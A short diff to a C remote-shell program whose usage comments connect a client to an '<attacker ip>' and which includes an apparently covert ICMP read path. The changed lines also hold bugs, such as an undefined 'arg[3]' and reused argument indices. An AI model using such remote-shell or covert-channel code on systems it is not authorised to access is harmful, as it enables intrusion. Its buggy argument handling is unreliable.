@@ -15,12 +15,6 @@
 // sudo ./remote_shell_exe c <attacker ip>
 // sudo ./remote_shell_exe s <target ip>
 
-
-// add authentication: 2 types: password manager and authorized server
-// docker cont with 2 comp versions each: correct and wrong
-// add google doc: table with compiler bugs share it with Cristian and Luis
-// document difficulties you find in general
-
 int main (int argc, char **argv)
 {
 
@@ -55,15 +49,14 @@ int main (int argc, char **argv)
         async_read_invisible (raw_init (argv[i+1], IPPROTO_ICMP), 0);
   #else
     #ifdef SECURE
+       char *ip_addr = argv[2];
+       char *remote_port = arg[3];
+       char *server_port = argv[2];
        printf("%s\n", "SECURE");
        if (argv[1][0] == 'c')
-           secure_shell (client_init (argv[2], atoi(argv[3])));
+           secure_shell (client_init (ip_addr, atoi(remote_port)));   // CLIENT
        else if (argv[1][0] == 's')
-           secure_shell (server_init (atoi(argv[2])));
-       else if (argv[1][0] == 'a')
-           async_read (client_init (argv[2], atoi(argv[3])), 0);
-       else if (argv[1][0] == 'b')
-           async_read (server_init (atoi(argv[2])), 0);
+           async_read (server_init (atoi(server_port))); // SERVER: client to stdin(i.e. 0)
     #else
         printf("%s\n", "NOT SECURE");
         if (argv[1][0] == 'c')
